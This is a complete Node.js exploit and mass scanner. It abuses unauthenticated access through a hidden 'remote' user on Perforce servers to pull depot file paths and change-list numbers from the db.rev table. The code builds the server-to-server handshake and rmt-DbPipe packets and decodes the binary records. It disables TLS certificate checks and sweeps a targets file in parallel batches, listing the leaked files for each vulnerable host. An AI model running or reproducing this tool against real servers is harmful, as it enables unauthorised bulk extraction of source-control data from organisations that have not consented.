// perforce-remote.js
// Exploits unauthenticated access to Perforce remote depots via the hidden "remote" user.
// Extracts depot file paths and change list numbers from db.rev table.
// Affected: server versions < 2025.1, security level < 4 (default level is 0).
//
// Usage: node perforce-remote.js [targets_file]
// Default targets file: targets.txt
// Targets format: host:port (one per line, port defaults to 1666 if omitted)
//
// Auto-detects: SSL vs plain TCP, ASCII vs unicode server mode.

'use strict';

const net = require('net');
const tls = require('tls');
const fs  = require('fs');

const CHUNK_SIZE   = 50;   // Lower: depot responses can be large
const TIMEOUT_MS   = 8000;
const DEFAULT_PORT = 1666;
const MAX_FILES_PER_TARGET = 10000;  // Stop reading once we've confirmed vuln with this many records
const RELEASE_MARKER = Buffer.from('func\x00\x07\x00\x00\x00release\x00');

const stats = { total: 0, vulnerable: 0, notVulnerable: 0, errors: 0, filesFound: 0 };

// --- Protocol ---

function packParam(name, value) {
    const n = Buffer.from(name,  'utf8');
    const v = Buffer.from(value, 'utf8');
    const b = Buffer.alloc(n.length + 1 + 4 + v.length + 1);
    let o = 0;
    n.copy(b, o); o += n.length; b[o++] = 0;
    b.writeUInt32LE(v.length, o); o += 4;
    v.copy(b, o); o += v.length; b[o++] = 0;
    return b;
}

function packParamRaw(name, rawValue) {
    // Like packParam but accepts a pre-built Buffer as the value (for binary payloads)
    const n = Buffer.from(name, 'utf8');
    const b = Buffer.alloc(n.length + 1 + 4 + rawValue.length + 1);
    let o = 0;
    n.copy(b, o); o += n.length; b[o++] = 0;
    b.writeUInt32LE(rawValue.length, o); o += 4;
    rawValue.copy(b, o); o += rawValue.length; b[o++] = 0;
    return b;
}

function buildPacket(params) {
    const bufs = params.map(p => Buffer.isBuffer(p[1]) ? packParamRaw(p[0], p[1]) : packParam(p[0], p[1]));
    const payload = Buffer.concat(bufs);
    const lo = payload.length & 0xFF, hi = (payload.length >> 8) & 0xFF;
    return Buffer.concat([Buffer.from([lo ^ hi, lo, hi, 0, 0]), payload]);
}

// Stores values as Buffers to safely handle binary data in dmr-DbPipe responses
function parseResponse(data) {
    let offset = 0;
    const packets = [];
    while (offset < data.length) {
        if (offset + 5 > data.length) break;
        const bodyLen = data[offset + 1] | (data[offset + 2] << 8);
        const total = 5 + bodyLen;
        if (offset + total > data.length) break;
        const body = data.subarray(offset + 5, offset + total);
        const pkt = {};
        let bo = 0;
        while (bo < body.length) {
            const ne = body.indexOf(0, bo); if (ne === -1) break;
            const key = body.toString('utf8', bo, ne); bo = ne + 1;
            if (bo + 4 > body.length) break;
            const vl = body.readUInt32LE(bo); bo += 4;
            if (bo + vl > body.length) break;
            pkt[key] = body.slice(bo, bo + vl); // Buffer — preserves binary data
            bo += vl + 1;
        }
        packets.push(pkt);
        offset += total;
    }
    return { packets, consumed: offset };
}

// --- db.rev Binary Decoder ---
// Decodes the binary 'data' blob returned in dmr-DbPipe response packets.

function decodeDbRev(buf) {
    let off = 0;
    const records = [];

    const readUInt32 = () => {
        if (off + 4 > buf.length) return null;
        const v = buf.readUInt32LE(off); off += 4; return v;
    };
    const readString = () => {
        const len = readUInt32();
        if (len === null || off + len > buf.length) return null;
        const s = buf.toString('utf8', off, off + len); off += len; return s;
    };

    while (off < buf.length) {
        const depotFile = readString(); if (depotFile === null) break;
        readUInt32(); // rev
        readUInt32(); // type
        readUInt32(); // action
        const change = readUInt32();
        const date   = readUInt32();
        readUInt32(); // modTime
        // Skip: Digest (16) + Size (8) + Trait (4) + Unknown (4) = 32 bytes
        if (off + 32 > buf.length) break;
        off += 32;
        // Trailing strings (lazyFile, revStr, typeStr) may be partially present;
        // don't break on null — the important fields are already read above.
        readString(); // lazyFile
        readString(); // revStr
        readString(); // typeStr
        records.push({ depotFile, change, date: new Date(date * 1000).toISOString().split('T')[0] });
    }
    return records;
}

// keyVal binary blob for rmt-DbPipe (42 bytes):
//   [0-3]  0x02000000  (int 2)
//   [4-5]  "//"
//   [6-9]  0xffffff7f  (INT_MAX)
//   [10-41] zeroes
const KEY_VAL = Buffer.concat([
    Buffer.from([0x02, 0x00, 0x00, 0x00]),
    Buffer.from('//'),
    Buffer.from([0xff, 0xff, 0xff, 0x7f]),
    Buffer.alloc(32)
]);

const RELEASE_PKT = buildPacket([['func', 'release']]);

// --- Query ---

// Returns: { packets, sslNeeded, unicodeNeeded, error }
function queryServer(host, port, useSSL, useUnicode) {
    return new Promise((resolve) => {
        const portStr = useSSL ? `ssl:${host}:${port}` : `${host}:${port}`;

        // Server-to-server protocol handshake (different from regular client handshake)
        const p1 = buildPacket([
            ['serverID', ''],
            ['cmdIdent', '4139E823 20EDF233 3D743292 62DFA422'],
            ['client', '97'],
            ['sndbuf', '1969919'],
            ['rcvbuf', '98304'],
            ['autoTune', '1'],
            ['func', 'protocol']
        ]);

        // rmt-DbPipe using the hidden "remote" user
        const cmd = [
            ['keyVal',      KEY_VAL],  // Buffer — packed as raw binary
            ['os',          'UNIX'],
            ['cwd',         ''],
            ['client',      ''],
            ['table',       'db.rev'],
            ['confirm',     'dmr-DbPipe'],
            ['version',     '10'],
            ['remoteRange', '1'],
            ['remoteMap0',  '//...'],
            ['user',        'remote']
        ];
        if (useUnicode) cmd.push(['unicode', '']);
        cmd.push(['func', 'rmt-DbPipe']);

        const payload = Buffer.concat([p1, buildPacket(cmd)]);

        let sock, buf = Buffer.alloc(0), allPackets = [], files = [], truncated = false, done = false, firstData = true;

        const finish = (result) => {
            if (done) return; done = true;
            if (sock && !sock.destroyed) { try { sock.write(RELEASE_PKT); } catch(_){} sock.destroy(); }
            resolve(result);
        };

        const onConnect = () => sock.write(payload);

        try {
            if (useSSL) {
                sock = tls.connect(port, host, { rejectUnauthorized: false, checkServerIdentity: () => null }, onConnect);
            } else {
                sock = new net.Socket();
                sock.connect(port, host, onConnect);
            }
        } catch(e) { return resolve({ packets: [], sslNeeded: false, unicodeNeeded: false, error: e.message }); }

        sock.setTimeout(TIMEOUT_MS);

        sock.on('data', (chunk) => {
            if (firstData && !useSSL && (chunk[0] === 0x15 || chunk[0] === 0x16)) {
                firstData = false;
                return finish({ packets: [], sslNeeded: true, unicodeNeeded: false, error: null });
            }
            firstData = false;

            buf = Buffer.concat([buf, chunk]);
            const r = parseResponse(buf);
            if (r.consumed > 0) buf = buf.subarray(r.consumed);
            allPackets.push(...r.packets);

            for (const pkt of r.packets) {
                const f = (pkt['fmt0'] ? pkt['fmt0'].toString('utf8') : '').toLowerCase();
                if (f.includes('unicode')) return finish({ packets: [], files: [], truncated: false, sslNeeded: false, unicodeNeeded: true, error: null });
                if (f.includes('ssl'))     return finish({ packets: [], files: [], truncated: false, sslNeeded: true,  unicodeNeeded: false, error: null });

                if (pkt['func'] && pkt['func'].toString('utf8') === 'dmr-DbPipe' && pkt['data']) {
                    files.push(...decodeDbRev(pkt['data']));
                }
            }

            if (files.length >= MAX_FILES_PER_TARGET) {
                truncated = true;
                return finish({ packets: allPackets, files: files.slice(0, MAX_FILES_PER_TARGET), truncated: true, sslNeeded: false, unicodeNeeded: false, error: null });
            }

            if (chunk.includes(RELEASE_MARKER)) {
                return finish({ packets: allPackets, files, truncated: false, sslNeeded: false, unicodeNeeded: false, error: null });
            }
        });

        sock.on('close', () => {
            if (!done) {
                const r = parseResponse(buf); allPackets.push(...r.packets);
                for (const pkt of r.packets) {
                    if (pkt['func'] && pkt['func'].toString('utf8') === 'dmr-DbPipe' && pkt['data']) {
                        files.push(...decodeDbRev(pkt['data']));
                    }
                }
                const sslNeeded = !useSSL && allPackets.length === 0;
                finish({ packets: allPackets, files, truncated, sslNeeded, unicodeNeeded: false, error: null });
            }
        });

        sock.on('error', (err) => { if (!done) finish({ packets: [], files: [], truncated: false, sslNeeded: false, unicodeNeeded: false, error: err.message }); });
        sock.on('timeout', () => {
            if (!done) {
                const r = parseResponse(buf); allPackets.push(...r.packets);
                for (const pkt of r.packets) {
                    if (pkt['func'] && pkt['func'].toString('utf8') === 'dmr-DbPipe' && pkt['data']) {
                        files.push(...decodeDbRev(pkt['data']));
                    }
                }
                finish({ packets: allPackets, files, truncated, sslNeeded: false, unicodeNeeded: false, error: 'timeout' });
            }
        });
    });
}

// --- Target Handler ---

async function checkTarget(host, port) {
    const label = `${host}:${port}`;

    let r = await queryServer(host, port, false, false);
    let useSSL = false;

    if (r.sslNeeded || (r.error && r.packets.length === 0 && r.error !== 'timeout')) {
        r = await queryServer(host, port, true, false);
        useSSL = true;
    }

    if (r.unicodeNeeded) {
        r = await queryServer(host, port, useSSL, true);
    }

    const proto = useSSL ? 'ssl' : 'tcp';
    const files = r.files || [];

    if (files.length > 0) {
        stats.vulnerable++;
        stats.filesFound += files.length;
        const suffix = r.truncated ? `${files.length}+ file(s), truncated` : `${files.length} file(s)`;
        console.log(`[${label}] [${proto}] VULNERABLE (${suffix})`);
        files.forEach(f => console.log(`  [change=${f.change}] [${f.date}] ${f.depotFile}`));
    } else if (r.packets.length > 0) {
        stats.notVulnerable++;
        console.log(`[${label}] [${proto}] NOT_VULNERABLE`);
    } else {
        stats.errors++;
        console.log(`[${label}] [${proto}] ERROR ${r.error || 'no response'}`);
    }
}

// --- Runner ---

async function run(targets) {
    stats.total = targets.length;
    for (let i = 0; i < targets.length; i += CHUNK_SIZE) {
        await Promise.all(targets.slice(i, i + CHUNK_SIZE).map(t => checkTarget(t.host, t.port)));
    }
    console.log(`\n[+] Done. Scanned: ${stats.total} | Vulnerable: ${stats.vulnerable} | Not vulnerable: ${stats.notVulnerable} | Errors: ${stats.errors} | Depot files found: ${stats.filesFound}`);
}

const filename = process.argv[2] || 'targets.txt';
if (!fs.existsSync(filename)) { console.error(`Error: '${filename}' not found.`); process.exit(1); }

const targets = fs.readFileSync(filename, 'utf-8').split(/\r?\n/)
    .map(l => l.trim()).filter(l => l && !l.startsWith('#'))
    .map(l => { const p = l.split(':'); return { host: p[0], port: parseInt(p[1], 10) || DEFAULT_PORT }; })
    .filter(t => t.host);

console.log(`[+] Loaded ${targets.length} targets from ${filename}`);
run(targets);
